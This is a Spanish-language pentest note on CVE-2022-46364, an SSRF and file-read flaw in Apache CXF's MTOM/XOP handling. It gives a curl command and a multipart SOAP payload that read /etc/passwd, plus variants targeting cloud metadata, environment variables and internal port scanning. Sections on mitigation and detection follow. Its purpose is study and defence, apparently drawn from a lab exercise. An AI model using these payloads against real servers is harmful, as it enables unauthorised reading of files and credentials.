---
topic: Apache CXF — SSRF en MTOM/XOP (CVE-2022-46364)
tags: [web, apache-cxf, soap, mtom, xop, ssrf, cve-2022-46364]
---

# Apache CXF — SSRF en MTOM/XOP (CVE-2022-46364)

[🌐 English](apache-cxf-mtom-ssrf.en.md) | **Español**

## Concepto

En una petición MTOM, el cuerpo SOAP puede incluir un elemento `<xop:Include href="cid:...">` que referencia un adjunto MIME. CXF resolvía ese `href` sin limitarlo a `cid:`, así que un valor `file://` o `http://` hacía que el servidor leyera el recurso y lo insertara en el parámetro. Es SSRF y lectura de archivos locales.

## Cuándo aplica

- Servicio SOAP con Apache CXF anterior a 3.4.10 o 3.5.5.
- Operación con al menos un parámetro de tipo cadena u objeto.
- El endpoint acepta `multipart/related`.

## Procedimiento

1. Obtener el WSDL y localizar una operación con parámetros.
2. Construir un sobre SOAP válido y comprobar la respuesta.
3. Envolver el sobre como parte raíz `application/xop+xml`.
4. Sustituir un campo por `<xop:Include href="file:///etc/passwd"/>`.
5. Enviar con `Content-Type: multipart/related` y leer la respuesta.

## Comandos

```bash
curl -s http://<IP>:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIME_boundary"' \
  --data-binary @poc.xml
```

```text
--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope ...>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--MIME_boundary
```

## Variantes

- `href="http://169.254.169.254/..."` para metadatos cloud.
- `href="file:///proc/self/environ"` para variables de entorno.
- Encadenar con un servicio interno que devuelva credenciales.
- Usar el SSRF para escanear puertos de localhost.

## Limitaciones

- Sin `multipart/related` CXF no procesa XOP.
- El parámetro debe ser de un tipo que acepte el `Include`.
- El archivo debe ser legible por el usuario del servicio.
- Las versiones parcheadas rechazan `href` que no sea `cid:`.

## Mitigación

- Actualizar CXF a 3.4.10/3.5.5 o superior.
- Restringir `xop:Include` a `cid:` y validar el Content-ID.
- Bloquear `file://`, `http://` y rangos internos en el parser.
- Ejecutar el servicio sin acceso a archivos sensibles.

## Detección

- Peticiones `multipart/related` con `xop:Include` y `file://`.
- Lecturas de `/etc/passwd` o claves por el proceso Java.
- Conexiones salientes a metadatos o localhost.
- Errores de deserialización con `unexpected element xop:Include`.

## Referencias

- [Apache CXF — Security advisories](https://cxf.apache.org/security-advisories.html)
- [NVD — CVE-2022-46364](https://nvd.nist.gov/vuln/detail/CVE-2022-46364)
- [0xdf — DevArea](https://0xdf.gitlab.io/2026/07/04/htb-devarea.html)
